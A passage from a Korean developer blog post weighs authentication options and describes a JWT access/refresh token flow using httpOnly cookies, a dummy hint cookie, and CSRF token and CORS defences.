있다.<li>Refresh 토큰이 탈취되어도 사용자 식별자를 판별할 수 없다.</ul><li>단점<ul><li>암복호화 시간이 추가된다.</ul></ul><li>그래서 어떤 방법 선택?<ul><li>현재는 Refresh 토큰에 사용자 식별자를 포함하는 것으로 구현되어 있다.<li>추후에 암호화하여 포함시키는 것을 검토하고 <br /> 문제 없으면 교체해보자.</ul></ul><h2 id="구체적인-구현-방법">구체적인 구현 방법</h2><ul><li>가정<ul><li>JWT 방식으로 인증을 구현한다.<li>Access 토큰과 Refresh 토큰을 사용하여 인증을 처리한다.<li>Refresh 토큰만으로 DB 조회 없이 Access 토큰 신규 발행이 가능하다.</ul><li>클라이언트<ul><li>/login 엔드포인트로 ID와 Password를 요청에 담아 보낸다.</ul><li>서버 - JWT 발행<ul><li>ID와 Password가 유효하다면 Access 토큰과 Refresh 토큰을 <br /> httpOnly = true 쿠키에 담아 응답에 담는다.<li>Access 토큰과 Refresh 토큰의 생명주기가 동일한 더미 힌트 쿠키도<br /> httpOnly = false 쿠키에 담고 응답에 담는다.<li>클라이언트로 응답한다.</ul><li>클라이언트<ul><li>/login 응답이 성공적으로 도착하였고, 더미 힌트 쿠키가 존재한다면<br /> 인증에 성공하였다고 판단한다.<li>더미 힌트 쿠키는 프론트에서 [로그인 /로그아웃 버튼]과 같이<br /> 로그인 여부를 판별해야 하는 상황에서 사용한다.<li>인증이 필요한 요청을 보낼때<br /> Refresh 토큰 더미 힌트 쿠키의 만료시간이 얼마 안 남았다면<br /> 새 Refresh 토큰 발급 API에 요청한다.<li>Refresh 토큰 더미 쿠키가 만료되어 없어졌다면<br /> 로그인 창으로 리다이렉트하여 사용자가 직접 인증하도록 유도한다.<li>서버에서 401 에러를 받았다면 로그인 창으로 리다이렉트하여<br /> 사용자가 직접 인증하도록 유도한다.</ul><li>서버<ul><li>Refresh 토큰이 유효하지 않다.<ul><li>현재 존재하는 요청에 담긴 Access 토큰과 Refresh 토큰을 만료시키고<br /> 401 에러로 응답한다.</ul><li>Refresh 토큰은 유효한데 Access 토큰이 만료되었다.<ul><li>Refresh 토큰으로 Access 토큰을 새로 발행한다.<li>이때 공격자가 의도적으로 잘못된 Access 토큰을 넣을 가능성도 있으므로<br /> CSRF 토큰을 도입하여 의도하지 않은 악의적 요청을 최대한 막는다.</ul><li>Refresh 토큰도 유효하고 Access 토큰도 유효하다.<ul><li>기존에 발행된 Access 토큰으로 인증 처리를 한다.</ul></ul></ul><h2 id="가장-보안적으로-그나마-안정적인-방식">가장 보안적으로 그나마 안정적인 방식</h2><ul><li>인증 정보는 httpOnly = true, samesite = lax, secure = true 쿠키에<br /> 담아 프론트에서 javascript로 조회할 수 없게 한다.<br /> (XSS 공격 방어)<li>CSRF 토큰을 사용하여 CSRF 공격을 막는다.<li>CORS 설정을 하여 웹 브라우저에서 서비스에서 의도하지 않은<br /> AJAX 통신을 막는다.</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/authentication/'>Authentication</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/jwt/" class="post-tag no-text-decoration" >jwt</a> <a href="/tags/essay/" class="post-tag no-text-decoration" >essay</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=인증방식 고민 - 의사줌치&url=https://a3magic3pocket.github.io/posts/exploring-authentication-options/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=인증방식 고민 - 의사줌치&u=https://a3magic3pocket.github.io/posts/exploring-authentication-options/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=인증방식 고민 - 의사줌치&url=https://a3magic3pocket.github.io/posts/exploring-authentication-options/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/kafka-large-scale-event-processing-architecture-and-performance-comparison/">Kafka를 활용한 대용량 이벤트 처리 구조 설계와 성능 비교</a><li><a href="/posts/experimenting-with-blue-green-deployments/">블루 - 그린 배포 실험</a><li><a href="/posts/spring-kafka-latest-message-pub-sub-config/">Spring Kafka에서 최신 메시지만 소비하는 Pub/Sub 방식 설정</a><li><a href="/posts/solving-concurrency-problems-with-performance-in-mind/">동시성 문제 해결 방안 성능 실험</a><li><a href="/posts/exploring-authentication-options/">인증방식 고민</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/kafka/">kafka</a> <a class="post-tag" href="/tags/kotlin/">kotlin</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a> <a class="post-tag" href="/tags/elk/">elk</a> <a class="post-tag" href="/tags/spring/">spring</a> <a class="post-tag" href="/tags/summary/">summary</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/kafka-streams/">kafka-streams</a> <a class="post-tag" href="/tags/nest/">nest</a> <a class="post-tag" href="/tags/react/">react</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/experimenting-with-blue-green-deployments/"><div class="card-body"> <span class="timeago small" > Apr 6 <i class="unloaded">2025-04-06T08:47:25+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>블루 - 그린 배포 실험</h3><div class="text-muted small"><p> 블루 - 그린 배포란? 두 개의 동일한 환경(블루와 그린)을 유지하며, 새 버전을 배포한 후 트래픽을 전환하여 새로운 버전을 운영에 적용 왜 하는가? 새로운 애플리케이션 버전을 배포하면서 서비스 중단 없이 안전하게 전환하기 위해서 작동 방식 블루 환경에서 운영 중 기존 애플리케이션(블루)이 사용자의 모든 트...</p></div></div></a></div><div class="card"> <a href="/posts/solving-concurrency-problems-with-performance-in-mind/"><div class="card-body"> <span class="timeago small" > Apr 6 <i class="unloaded">2025-04-06T08:48:05+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>동시성 문제 해결 방안 성능 실험</h3><div class="text-muted small"><p> 동시성 문제란? 여러 프로세스나 스레드가 동시에 실행되는 상황에서 자원(데이터 등)을 제대로 공유하거나 수정하지 못해 발생하는 문제 구체적인 상황 id, numLikes 필드로 이뤄진 POST 테이블이 있다. likePost 함수는 postId를 인자로 받고, post을 조회한 뒤 기존 numLikes를 읽고 그 값에 +1을 한 ...</p></div></div></a></div><div class="card"> <a href="/posts/where-you-save-auth-in-client/"><div class="card-body"> <span class="timeago small" > Aug 30, 2021 <i class="unloaded">2021-08-30T15:31:00+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>React 사용 시 JWT를 어디에 저장해야할까?</h3><div class="text-muted small"><p> 개요 예전에 React를 처음 사용할 때 backend를 jwt 인증방식으로 구현한 뒤 frontend에서는 이 jwt를 어디에 저장할지 고민했었다. 그때 4장. JWT 이해 및 적용를 보고 쿠키에 httpOnly 설정으로 저장하는 방법을 사용하기로 결정했다. 당시는 따라하는데 급급하여 무작정 똑같이 하였는데, 이번에 gonic-gin C...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/solving-concurrency-problems-with-performance-in-mind/" class="btn btn-outline-primary" prompt="Older"><p>동시성 문제 해결 방안 성능 실험</p></a> <a href="/posts/metrics-monitoring-with-prometheus-grafana-and-alertmanager/" class="btn btn-outline-primary" prompt="Newer"><p>메트릭 모니터링(prometheus, grafana, alertmanager)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/a3magic3pocket">의사줌치</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/kafka/">kafka</a> <a class="post-tag" href="/tags/kotlin/">kotlin</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a> <a class="post-tag" href="/tags/elk/">elk</a> <a class="post-tag" href="/tags/spring/">spring</a> <a class="post-tag" href="/tags/summary/">summary</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/kafka-streams/">kafka streams</a> <a class="post-tag" href="/tags/nest/">nest</a> <a class="post-tag" href="/tags/react/">react</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://a3magic3pocket.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
